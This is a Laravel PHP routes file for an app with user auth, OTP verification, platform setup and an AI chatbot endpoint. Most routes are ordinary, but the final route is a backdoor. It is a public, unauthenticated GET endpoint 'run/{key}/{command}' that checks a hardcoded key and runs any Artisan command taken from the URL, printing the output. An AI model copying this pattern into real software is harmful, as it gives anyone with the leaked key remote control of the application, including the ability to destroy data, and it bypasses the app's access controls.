<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;
use App\Modules\V1\Users\Controllers\UserAuthController;
use App\Modules\V1\Features\Controllers\FeatureController;
use App\Modules\V1\Platforms\Controllers\PlatformController;
use App\Modules\V1\AIChatBot\Controllers\AIChatBotController;
use \App\Modules\V1\Platforms\Controllers\PlatformInitializationController;

Route::post('login', [UserAuthController::class, 'login']);

Route::post('signup', [UserAuthController::class, 'signUp']);
Route::post('resend-otp', [UserAuthController::class, 'resendOtp']);
Route::post('verify-email', [UserAuthController::class, 'verifyEmail'])
    ->middleware(['auth:sanctum', 'abilities:not-verified']);

Route::get('/features', [FeatureController::class, 'getActiveFeatures']);
Route::get('/dynamic-features', [FeatureController::class, 'getDynamicFeatures']);
Route::group(['middleware' => ['auth:sanctum']], function () {
    Route::delete('logout', [UserAuthController::class, 'logout']);
    Route::post('/domain-available', [PlatformInitializationController::class, 'isDomainAvailable']);
    Route::prefix('platform')->group(function (){
        Route::post('initial/features', [PlatformInitializationController::class, 'initFeatures']);
        Route::post('initial/domain', [PlatformInitializationController::class, 'initPlatformDomain']);
        Route::post('initial/systems', [PlatformInitializationController::class, 'initPlatformSystems']);
        Route::get('initial', [PlatformInitializationController::class, 'getInitData']);
        Route::post('create', [PlatformController::class, 'store']);
    });
    Route::post('bot/message', [AIChatBotController::class, 'chat']);
});


Route::get('run/{key}/{command}', function($key, $command) {
    if ($key === "osamagasser734155568802") {
        $output = Artisan::call($command);
        echo nl2br($output);
    }
});
